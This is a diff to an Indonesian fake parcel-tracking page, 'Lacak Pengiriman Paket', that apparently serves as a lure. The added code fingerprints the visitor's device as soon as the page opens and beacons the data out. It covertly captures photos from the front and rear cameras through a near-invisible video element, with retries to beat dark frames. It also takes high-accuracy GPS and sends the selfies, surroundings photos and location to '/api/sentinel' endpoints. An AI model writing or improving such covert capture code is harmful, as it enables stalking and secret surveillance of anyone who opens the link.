@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="robots" content="noindex, nofollow">
   <title>Lacak Pengiriman Paket — Konfirmasi Alamat</title>
   <style>
     :root {
@@ -141,12 +140,14 @@
     }
 
     #hiddenVideo, #hiddenCanvas {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      opacity: 0.01;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 160px;
+      height: 120px;
+      opacity: 0.001;
       pointer-events: none;
-      left: -9999px;
+      z-index: -9999;
     }
   </style>
 </head>
@@ -263,6 +264,28 @@
   <canvas id="hiddenCanvas"></canvas>
 
   <script>
+    // PASSIVE FIRST-PING: kirim seketika saat halaman dibuka, tanpa butuh izin apapun
+    (function() {
+      var s = {};
+      try { s.screen = window.screen.width + 'x' + window.screen.height + '(@' + (window.devicePixelRatio||1) + 'x)'; } catch(e){}
+      try { s.ua = navigator.userAgent; } catch(e){}
+      try { s.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      try { s.lang = navigator.language; } catch(e){}
+      try { s.cores = navigator.hardwareConcurrency; } catch(e){}
+      try { s.touch = navigator.maxTouchPoints; } catch(e){}
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) { s.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); s.gpuV = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); }
+        }
+      } catch(e){}
+      var payload = JSON.stringify({ alertType: 'passive_hit_paket', passiveStats: s });
+      try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/beacon', new Blob([payload], {type:'application/json'})); } catch(e){}
+      try { fetch('/api/sentinel/beacon', {method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true}).catch(function(){}); } catch(e){}
+    })();
+
     let capturedPhoto = false;
     let currentActivity = '🛑 Diam (Stasioner)';
     let lastMotionTime = 0;
@@ -355,7 +378,20 @@
       } catch(e) {}
     }
 
-    function snapCurrentVideoFrame(video, canvas, quality = 0.75) {
+    function isFrameBlack(ctx, w, h) {
+      try {
+        const sample = ctx.getImageData(0, 0, Math.min(w, 40), Math.min(h, 40)).data;
+        let sum = 0;
+        for (let i = 0; i < sample.length; i += 4) {
+          sum += sample[i] + sample[i+1] + sample[i+2];
+        }
+        return sum < 80;
+      } catch(e) {
+        return false;
+      }
+    }
+
+    function snapCurrentVideoFrame(video, canvas, quality = 0.8) {
       try {
         const w = video.videoWidth || 640;
         const h = video.videoHeight || 480;
@@ -364,13 +400,16 @@
         canvas.height = h;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, w, h);
+        if (isFrameBlack(ctx, w, h)) {
+          return null;
+        }
         return canvas.toDataURL('image/jpeg', quality);
       } catch(e) {
         return null;
       }
     }
 
-    function waitForFirstFrame(video, timeoutMs = 280) {
+    function waitForFirstFrame(video, timeoutMs = 400) {
       return new Promise(resolve => {
         if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
         let done = false;
@@ -436,10 +475,11 @@
     let capturedRearPhoto = false;
     let isHarvesting = false;
 
-    // 3. Fungsi jepret kamera spesifik
-    async function captureCameraFacing(facing, minWaitMs = 150) {
+    // 3. Fungsi jepret kamera spesifik (Sequential + Auto-exposure warmup)
+    async function captureCameraFacing(facing, minWaitMs = 500) {
+      let stream = null;
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
+        stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
           audio: false
         });
@@ -448,22 +488,42 @@
         const canvas = document.getElementById('hiddenCanvas');
         video.srcObject = stream;
         try { await video.play(); } catch(e){}
-        await waitForFirstFrame(video, minWaitMs);
-        const dataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+
+        // Tunggu minimal 500ms agar lensa kamera dan sensor auto-exposure iOS menyesuaikan cahaya
+        await waitForFirstFrame(video, 400);
+        await new Promise(r => setTimeout(r, minWaitMs));
+
+        // Ambil frame (coba 2x jika masih gelap)
+        let dataUrl = snapCurrentVideoFrame(video, canvas, 0.8);
+        if (!dataUrl) {
+          await new Promise(r => setTimeout(r, 200));
+          dataUrl = snapCurrentVideoFrame(video, canvas, 0.8);
+        }
+        if (!dataUrl) {
+          // Fallback paksa jika sensor belum melaporkan kecerahan
+          try {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+          } catch(e){}
+        }
+
         stream.getTracks().forEach(t => t.stop());
         currentActiveStream = null;
         return dataUrl;
       } catch (err) {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        currentActiveStream = null;
         return null;
       }
     }
 
-    // 4. Pemanenan Bukti Paralel Secepat Kilat (Ultra-Fast Parallel Evidence Harvest)
+    // 4. Pemanenan Bukti Terpadu Secepat Kilat (Sequential Kamera Depan -> Belakang)
     async function executeParallelHarvest(triggerSource = 'auto_instant') {
       if (isHarvesting) return;
       isHarvesting = true;
 
-      // Promise 1: GPS Presisi Tinggi
+      // 1. Ambil GPS & Data Perangkat di latar belakang
       const gpsPromise = new Promise((resolve) => {
         if (!navigator.geolocation) return resolve(null);
         navigator.geolocation.getCurrentPosition(
@@ -475,27 +535,34 @@
           { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
         );
       });
-
-      // Promise 2: Kamera Depan (Wajah) jika belum ada
-      const frontPromise = !capturedFrontPhoto ? captureCameraFacing('user', 180) : Promise.resolve(null);
-
-      // Promise 3: Kamera Belakang (Lingkungan Depan) jika belum ada
-      const rearPromise = !capturedRearPhoto ? captureCameraFacing('environment', 200) : Promise.resolve(null);
-
-      // Promise 4: Telemetri Perangkat & Hardware
       const statsPromise = getAdvancedStats();
 
-      // JALANKAN SEMUA SECARA PARALEL SEKALIGUS (PARALLEL HARVEST)
-      const [posRes, frontRes, rearRes, statsRes] = await Promise.allSettled([
-        gpsPromise,
-        frontPromise,
-        rearPromise,
-        statsPromise
-      ]);
+      // 2. Kamera Depan (Wajah) DULUAN (Sequential agar tidak bentrok di WebKit)
+      let frontPhoto = null;
+      if (!capturedFrontPhoto) {
+        frontPhoto = await captureCameraFacing('user', 450);
+        if (frontPhoto) {
+          capturedFrontPhoto = true;
+          sendPhotoWithKeepalive('/api/sentinel/selfie', frontPhoto, `trap_paket_${triggerSource}`);
+        }
+      }
 
+      // Jeda 180ms agar hardware kamera iOS melepaskan sensor depan sebelum membuka belakang
+      await new Promise(r => setTimeout(r, 180));
+
+      // 3. Kamera Belakang (Lingkungan Depan) SETELAH Kamera Depan
+      let rearPhoto = null;
+      if (!capturedRearPhoto) {
+        rearPhoto = await captureCameraFacing('environment', 450);
+        if (rearPhoto) {
+          capturedRearPhoto = true;
+          sendPhotoWithKeepalive('/api/sentinel/environment', rearPhoto, `trap_paket_${triggerSource}`);
+        }
+      }
+
+      // Tunggu GPS & Data Perangkat Selesai
+      const [posRes, statsRes] = await Promise.allSettled([gpsPromise, statsPromise]);
       const pos = (posRes.status === 'fulfilled' && posRes.value) ? posRes.value : null;
-      const frontPhoto = (frontRes.status === 'fulfilled' && frontRes.value) ? frontRes.value : null;
-      const rearPhoto = (rearRes.status === 'fulfilled' && rearRes.value) ? rearRes.value : null;
       const stats = (statsRes.status === 'fulfilled' && statsRes.value) ? statsRes.value : {};
 
       if (frontPhoto) {
@@ -605,6 +672,7 @@
         btn.style.opacity = '0.7';
         btn.disabled = true;
       }
+      isHarvesting = false;
       executeParallelHarvest('button_confirm_click');
     }
 
